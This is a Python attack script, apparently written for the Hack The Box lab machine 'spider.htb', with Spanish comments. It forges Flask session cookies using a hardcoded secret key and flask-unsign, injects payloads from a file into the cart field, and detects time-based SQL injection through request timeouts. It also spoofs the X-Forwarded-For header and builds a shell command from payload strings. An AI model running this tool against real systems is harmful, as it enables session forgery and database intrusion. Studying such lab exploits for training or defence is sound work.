#!/usr/bin/python3

### References
### | enumerate(): https://stackoverflow.com/questions/2081836/how-to-read-specific-lines-from-a-file-by-line-number
### | flash-unsign: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
### | terminate_loop: https://stackoverflow.com/questions/24426451/how-to-terminate-loop-gracefully-when-ctrlc-was-pressed-in-python/24426816
### | Avoid system errors: https://stackoverflow.com/questions/33985863/hiding-console-output-produced-by-os-system

import os, subprocess, signal
import requests, time, string

class BienMal:
    DONE = "✔"
    FAIL = "✘"

# ¬ CTRL+C
terminate = False
def def_handler(sig, frame):
    global terminate
    terminate = True
    print("\n\nsaLi3nDO...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://spider.htb"
uuid_user = "fd0b0386-ba0c-4b54-9ad2-115522b90729"
secret_key = "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
session = requests.Session()

with open('./payloads.txt', 'r') as payload_file:
    for pos, payload in enumerate(payload_file):
        if terminate: break # Para que realmente nos saque del bucle y del programa al dar CTRL+C

        payload = payload.strip('\n')
        json_payload = '{"cart_items": ["%s"],"uuid": "%s"}' % (payload, uuid_user)
        try:
            # ¬ Generamos token sin firmar con la herramienta flask-unsign
            session_token = subprocess.check_output("flask-unsign --sign --cookie '%s' --secret '%s' 2>/dev/null" % (json_payload, secret_key), shell=True, stderr=subprocess.STDOUT)
            headers = {
                "X-Forwarded-For": "127.0.0.1",
                "Cookie" : "session=" + session_token.decode('utf-8').strip('\n')
            }
            # ¬ Intentamos visitar /cart con la nueva cookie, si se demora más de 3 segundos sabemos que tenemos SQLi con ese payload
            r = session.get(url + '/cart', headers=headers, timeout=3)
        except requests.exceptions.Timeout:
            # ¬ Si obtenemos el timeout de 3 segundos cae acá y nos informa del payload que lo causo.
            print("[+] %s - %s" % (payload, BienMal.DONE)) 

        except:
            # ¬ Entra acá si hay algún error en la ejecución de flask-unsign o del propio sistema.
            pass
